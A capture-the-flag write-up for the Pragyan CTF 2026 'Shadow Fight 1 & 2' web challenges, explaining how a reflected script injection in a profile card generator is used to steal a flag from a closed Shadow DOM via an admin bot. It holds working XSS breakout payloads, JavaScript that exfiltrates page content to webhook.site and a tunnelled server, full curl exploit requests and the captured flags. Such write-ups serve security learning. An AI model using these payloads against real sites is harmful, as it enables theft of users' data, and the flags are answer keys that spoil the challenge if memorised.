# Shadow Fight 1 & 2 - Web  Writeup

| Field | Value |
|-------|--------|
| **CTF** | Pragyan CTF 2026 |
| **Category** | Web |
## Challenge Summary

The application is a **Profile Card Generator** that accepts two query parameters:

- `name`
- `avatar`

Profiles can be submitted for **admin review**, where an **admin bot** visits the generated page.

The goal is to extract the **flag**, which is placed inside a **closed Shadow DOM** and only contains the real value when viewed by the admin.

---

## Key Observations
>These observations form the common exploitation primitive, while Shadow Fight 1 and Shadow Fight 2 differ in how tightly the input constraints are enforced.

### 1. Injection Context

The `name` parameter is reflected inside a JavaScript string:

```js
const name = "USER_INPUT";
```
- Double quotes (") are blocked
- JavaScript string escape is not possible

### 2. Critical Parser Behavior

Although JavaScript strings cannot be broken:

`"</script>"`

always closes the `<script>` tag at the HTML parser level, regardless of JavaScript context.

This allows us to escape the script block entirely.

### 3. Server-Side Filter Weakness

The isSafe() filter blocks JavaScript keywords such as:
- document
- window
- fetch
- Function
- constructor

However:

- HTML tags are not blocked

- `<script>` tags pass validation

- `</script>` is not filtered

### 4. No CSP (Content Security Policy)

- There is no CSP header, which means:

- External scripts can be freely loaded

- `<script src=//attacker>` is allowed

### 5. Flag Location

The flag is injected into the page inside a `<script>` tag that creates a closed Shadow DOM:

` shadow.innerHTML = '<p style="opacity: 0;">p_ctf{redacted-no-admin}</div>';`

Although the `Shadow DOM` is closed, the script source code itself is readable via:

`document.scripts[1].textContent`

---

# Shadow Fight 1

This section describes the exploitation steps used to solve **Shadow Fight 1**, assuming the general observations (script context injection, parser behavior, lack of CSP, etc.) are already understood.

---

## Step 1  Identify the Injection Sink

The `name` parameter is reflected into the page and rendered via `innerHTML` inside a `<script>` block.

This allows us to inject HTML if we can escape the surrounding script context.

---

## Step 2  Break Out of the Script Context

Even though JavaScript string escaping is blocked, the HTML parser will still terminate a `<script>` tag when it encounters:`</script>`

So we inject a payload that:
1. Closes the original script
2. Opens a new script tag
3. Executes arbitrary JavaScript
Payload structure:`</script><script>JS_HERE</script>`
This bypasses the `isSafe()` keyword filter because:

- No blocked keywords are needed to break the context
- HTML tags are not filtered

## Step 3  Locate the Flag Source

The flag is placed into a closed Shadow DOM, but the JavaScript that creates it is still present in the page source:`shadow.innerHTML = '<p style="opacity: 0;">FLAG_HERE</p>';`

Even though `shadowRoot` is inaccessible, the script source code itself is readable.

The flag can be obtained by reading the second script tag:`document.querySelectorAll('script')[1].textContent`

This works because:

- Closed Shadow DOM only hides runtime access
- Script source remains accessible via the DOM

## Step 4  Exfiltrate the Script Contents

To leak the data without using blocked APIs (fetch, XMLHttpRequest, etc.), we use an image request:

`new Image().src = 'https://webhook.site/XXXX?d=' + encodeURIComponent(data)`

This sends the script contents to an external server controlled by us.

## Step 5  Final JavaScript Payload

Combined payload executed inside the injected `<script>` tag:
```
var s = document.querySelectorAll('script')[1].textContent;
new Image().src ='https://webhook.site/89954e44-dc0b-44e1-9fe4-5231a98e0e1d?d=' + encodeURIComponent(s);

```

This:

- Reads the script that constructs the Shadow DOM
- Extracts the embedded flag
- Sends it to the webhook

## Step 6  Full Exploit Request

The payload is submitted via the /review endpoint so the admin bot executes it.

```
curl -X POST "https://shadow-fight.ctf.prgy.in/review?name=</script><script>var%20s%3Ddocument.querySelectorAll('script')%5B1%5D.textContent%3Bnew%20Image().src%3D'https%3A//webhook.site/89954e44-dc0b-44e1-9fe4-5231a98e0e1d%3Fd%3D'%2BencodeURIComponent(s)</script>&avatar=https%3A//picsum.photos/100/100"

```
Now Go to Webhook and get the Flag...

## Flag for Shadow Fight 1
`p_ctf{uRi_iz_js_db76a80a938a9ce3}`

> Note: Although a more complex solution involving inline handlers and prototype manipulation exists, this challenge could be solved more directly by escaping the script context and reading the script source where the flag is embedded.

Done Shadow fight 1 dead.

# Shadow Fight 2

This section describes the exploitation steps used to solve **Shadow Fight 2**, assuming you understand **Shadow Fight 1**.Although both challenges lack a Content Security Policy (CSP) and allow external scripts, Shadow Fight 2 enforces much stricter payload length validation, which significantly influences payload design.


- Here the BOT checks the payload length strictly on the / review subdomain too so we need to carefull here but the overall payload will be same.


## Exploit Strategy

1. Escape the original `<script>` tag using `</script>`
2. Inject a new `<script src=...>` pointing to our server
3. Host a JavaScript payload that:
    - Reads the script source
    - Exfiltrates it to our server
4. Submit the profile for admin review
5. Admin bot executes our script
6. Flag is leaked to our server

### Final Injection Payload (Name Parameter)

Must be ≤ 50 characters

`</script><script src=//5e37773d77897e.lhr.life/x>`

This payload:

- Closes the existing script
- Loads our external JavaScript
- Fits the length constraint

## Hosting the Payload
### 1. JavaScript Payload (x)

This payload extracts the full HTML (or script source) and sends it back.
```
new Image().src='https://5e37773d77897e.lhr.life/?d='+encodeURIComponent(document.querySelectorAll('script')[1].textContent)
```

(Using `document.querySelectorAll('script')[1]` since the flag is known to be there.)

### 2. Exfiltration Server (Python)
```
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
This server: Serves the payload

### 3. Expose the Server

`ssh -R 80:localhost:8000 localhost.run`

This gives a public URL such as:`https://abcd1234.lhr.life`

### Submitting the Exploit

Send the profile for review with the payload encoded:
```
curl -X POST 'https://shadow-fight-2.ctf.prgy.in/review?name=%3C/script%3E%3Cscript%20src=//3fbaf9e8d83a52.lhr.life/x%3E&avatar=https%3A//picsum.photos/100/100'

We'll review your profile soon!
```
Now check you server output we can see 

```
GET /?d=%0A%20%20%20%20%20%20(function()%20%7B%0A%20%20%20%20%20%20%20%20const%20container%20%3D%20document.createElement(%27div%27)%3B%0A%20%20%20%20%20%20%20%20container.id%20%3D%20%27secret%27%3B%0A%20%20%20%20%20%20%20%20const%20shadow%20%3D%20container.attachShadow(%7B%20mode%3A%20%27closed%27%20%7D)%3B%0A%20%20%20%20%20%20%20%20shadow.innerHTML%20%3D%20%27%3Cp%20style%3D%22opacity%3A%200%3B%22%3Ep_ctf%7Badmz_nekki_kekw_c6e194c17f2405c5%7D%3C%2Fdiv%3E%27%3B%0A%20%20%20%20%20%20%20%20document.querySelector(%27.card%27).appendChild(container)%3B%0A%20%20%20%20%20%20%7D)()%3B%0A%20%20%20%20 HTTP/1.1" 200 -

```
Now just URL Decode it and you will get

```
(function() {
        const container = document.createElement('div');
        container.id = 'secret';
        const shadow = container.attachShadow({ mode: 'closed' });
        shadow.innerHTML = '<p style="opacity: 0;">p_ctf{admz_nekki_kekw_c6e194c17f2405c5}</div>';
        document.querySelector('.card').appendChild(container);
      })();
```

## Flag for Shadow Fight 2
`p_ctf{admz_nekki_kekw_c6e194c17f2405c5}`

PWN by **W4RR1OR**
